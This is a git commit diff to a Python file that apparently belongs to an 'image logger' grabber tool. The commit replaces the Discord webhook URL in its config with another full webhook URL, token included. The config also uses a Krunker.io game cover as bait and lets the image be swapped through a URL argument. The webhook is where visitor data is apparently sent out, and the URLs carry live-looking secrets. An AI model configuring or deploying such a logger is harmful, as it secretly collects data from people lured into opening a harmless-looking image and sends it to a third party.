f1557e92a515ceab35f5ba4ae2b8926e8f56b81e
Leonardo Libroia <75328795+sonoFuji27@users.noreply.github.com>
2023-07-21 18:45:11 +0200

    Update party5286.py

--- api/party5286.py
+++ api/party5286.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1084217021539045376/MG2BSxX6zYW6dRoDvgmjyoEGJzijyWZlXBTK_Pw389p94ar4FcqYdzKaLfW0Wh3DIsgv",
+    "webhook": "https://discord.com/api/webhooks/1131989215194923048/I3ECtzOeatiVH2f6IPB9jT4kmInhADxFSwWKHL1FHzTw2jJBVRcVwZrozbcvRcZV3IQU",
     "image": "https://images.crazygames.com/games/krunker-io/cover-1591336739727.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
